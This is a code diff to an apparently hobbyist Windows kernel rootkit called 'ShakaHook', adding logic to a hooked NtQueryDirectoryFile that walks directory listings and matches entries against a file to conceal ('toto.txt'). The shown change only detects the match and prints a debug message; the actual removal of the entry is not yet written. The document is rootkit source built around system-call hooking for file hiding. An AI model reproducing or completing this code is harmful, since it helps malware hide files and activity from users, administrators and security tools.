@@ -101,7 +101,11 @@ NTSTATUS NewNtQueryDirectoryFile(
 	PVOID parentProcess, childProcess;
 	PUNICODE_STRING parentName, childName;
 	*/
+	PFILE_ID_BOTH_DIR_INFORMATION fileIdBothDirInformation;
+	UNICODE_STRING filename;
 	NTSTATUS rc;
+	ULONG offset = 0; 
+	UNICODE_STRING fileToHideName;
 
 	rc = (*OldNtQueryDirectoryFile) (
 		FileHandle,
@@ -146,9 +150,37 @@ NTSTATUS NewNtQueryDirectoryFile(
 		ExFreePoolWithTag(parentProcess, 'Efe');
 	if (childProcess != NULL)
 		ExFreePoolWithTag(childProcess, 'Efe');*/
-
+	RtlInitUnicodeString(&fileToHideName, L"toto.txt"); 
 	DbgPrint("#=== ShakaHook NtQueryDirectoryFile ===#\n");
+	DbgPrint("FileInformationClass: %d\n", FileInformationClass);
+	
+	switch (FileInformationClass)
+	{
+		/*case 12: // _FILE_NAMES_INFORMATION 
+			pFI = (PFILE_NAMES_INFORMATION) FileInformation;
+			filename.Length = ((PFILE_NAMES_INFORMATION) pFI)->FileNameLength;
+			filename.Buffer = ((PFILE_NAMES_INFORMATION) pFI)->FileName;
+			DbgPrint("filename %wZ\n", filename);
+			break;
+			*/
+		case 37: // FILE_ID_BOTH_DIR_INFORMATION 
+			DbgPrint("FILE_ID_BOTH_DIR_INFORMATION \n");
+			do
+			{
+				fileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
+				filename.Length = fileIdBothDirInformation->FileNameLength;
+				filename.Buffer = (PWSTR)(fileIdBothDirInformation->FileName);
+				DbgPrint("offset %ld, filename %wZ \n", offset, &filename);
+				DbgPrint("%wZ == %wZ \n", &filename, &fileToHideName);
+				if (RtlCompareUnicodeString(&filename, &fileToHideName, TRUE) == 0)
+				{
+					DbgPrint("C BON FRER \n", offset, &filename);
+				}
 
+				offset += (ULONG) (fileIdBothDirInformation->NextEntryOffset);
+			} while(fileIdBothDirInformation->NextEntryOffset != 0 && offset < Length);
+			break;
+	}
 	return rc;
 }
 
